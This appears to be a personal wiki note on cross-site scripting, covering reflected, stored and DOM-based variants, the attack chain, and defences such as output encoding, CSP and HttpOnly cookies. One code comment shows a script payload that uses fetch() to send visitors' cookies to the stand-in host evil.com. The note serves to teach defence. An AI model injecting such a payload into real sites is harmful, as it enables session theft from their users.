---
title: "Cross Site Scripting"
created: 2026-04-13
updated: 2026-04-13
type: concept
tags: [web-security, xss, cybersecurity, injection-attacks, input-sanitization]
---

# Cross Site Scripting

Cross-Site Scripting (XSS) is a client-side code injection attack where an attacker embeds malicious scripts into trusted websites. When other users visit the compromised page, the malicious code executes in their browser, potentially stealing session tokens, cookies, or other sensitive data. XSS remains one of the most prevalent web security vulnerabilities, ranking consistently high in the OWASP Top 10.

## Key Concepts

XSS vulnerabilities arise when web applications incorporate untrusted data into web pages without proper validation or escaping. The attack works by injecting executable script code (typically JavaScript) into output that a web application generates for users.

Three primary types of XSS attacks exist:

**Reflected XSS** occurs when user-supplied data is immediately returned by a web application without proper sanitization. The malicious script arrives via a crafted URL or request. Example: a search field that echoes the search term back without encoding.

**Stored XSS** (Persistent XSS) is more dangerous—the malicious script gets permanently stored on the target server. Every user who views the affected page executes the payload. Common targets include comment fields, forum posts, and user profiles.

**DOM-based XSS** exploits vulnerabilities in client-side JavaScript that processes user input directly in the Document Object Model (DOM). The server isn't involved in the attack—the vulnerability exists entirely in the victim's browser.

## How It Works

The typical XSS attack chain:

1. Attacker identifies a web application that accepts user input without proper sanitization
2. Attacker crafts a payload containing malicious JavaScript
3. Payload is submitted via URL parameters, form fields, or stored on the server
4. When other users access the affected page, their browser executes the payload
5. Attacker steals sensitive data (session cookies, tokens, keystrokes) or performs actions on behalf of the user

```javascript
// Example: Malicious script injection
// Attacker submits: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
// If reflected without encoding, every visitor's cookies get stolen

// Safe output requires encoding
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, 
    c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c])
  );
}
```

## Prevention Techniques

**Input Validation** — Validate all user inputs on the server side. Reject inputs that contain suspicious patterns like `<script` tags or JavaScript event handlers.

**Output Encoding** — Encode data before rendering it in HTML, JavaScript, CSS, or URL contexts. Use framework-provided escaping functions rather than manual encoding.

**Content Security Policy (CSP)** — HTTP header that specifies which scripts can execute on a page. CSP can block inline scripts and restrict script sources.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

**HTTPOnly and Secure Cookies** — Mark session cookies with `HttpOnly` to prevent JavaScript access, and `Secure` to ensure transmission only over HTTPS.

**Sanitization Libraries** — Use established libraries like DOMPurify (JavaScript) or OWASP Java Encoder for HTML sanitization when allowing rich text input.

## Practical Applications

XSS testing is essential in [[security-testing]] workflows. Security engineers use automated scanners (Burp Suite, OWASP ZAP) and manual testing to identify XSS vulnerabilities before deployment.

Modern frameworks like React, Angular, and Vue automatically escape values in templates, reducing XSS risk. However, developers must avoid patterns like `dangerouslySetInnerHTML` which bypass escaping.

## Related Concepts

- [[injection-attacks]] — Broader category of attacks including SQL injection and command injection
- [[input-sanitization]] — Techniques for cleaning user inputs
- [[web-security]] — General web application security
- [[session-management]] — How sessions are hijacked via XSS
- [[owasp]] — Organization providing XSS prevention guidelines

## Further Reading

- OWASP XSS Prevention Cheat Sheet
- PortSwigger Web Security Academy — XSS
- Mozilla Developer Network — Cross-site scripting

## Personal Notes

XSS was my first major security learning—the classic alert('XSS') test that every web developer learns. The shift from focusing on server-side validation to understanding browser-side execution was eye-opening. Always treat user input as potentially hostile, regardless of context.
